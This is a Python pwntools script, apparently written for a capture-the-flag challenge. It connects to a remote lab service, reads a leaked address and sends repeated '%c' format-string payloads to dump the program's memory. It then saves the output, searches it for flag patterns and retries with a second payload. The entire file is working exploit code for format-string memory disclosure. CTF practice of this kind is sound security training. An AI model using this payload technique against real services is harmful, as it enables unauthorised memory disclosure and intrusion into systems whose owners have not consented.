#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'info'

r = remote("pwn-zoroblindpath.hackena-labs.com", 443, ssl=True)

r.recvuntil(b"Clue: ")
leak = r.recvline().strip()
log.info(f"Leaked address: {leak}")

r.recvuntil(b"Write your path:")

# Send moderate number of %c
payload = b"%c" * 120
r.sendline(payload)

# Receive everything available
time.sleep(1)
response = b""
while True:
    try:
        chunk = r.recv(timeout=0.5)
        if not chunk:
            break
        response += chunk
    except:
        break

log.info(f"Total response length: {len(response)} bytes")

# Save to file for analysis
with open('response_dump.bin', 'wb') as f:
    f.write(response)

# Look for flag patterns
flag_patterns = [
    rb'0xL4ugh\{[^}]+\}',
    rb'flag\{[^}]+\}',
    rb'FLAG\{[^}]+\}',
]

for pattern in flag_patterns:
    matches = re.findall(pattern, response, re.IGNORECASE)
    if matches:
        for match in matches:
            log.success(f"Found potential flag: {match}")

# Print hex dump
log.info("Hex dump of first 300 bytes:")
print(hexdump(response[:300]))

# Try second input
if b"Wrong path" in response:
    log.info("Sending second payload...")
    r.sendline(b"%c" * 120)
    response2 = r.recvall(timeout=2)
    log.info(f"Second response length: {len(response2)}")
    print(hexdump(response2[:300]))

r.close()
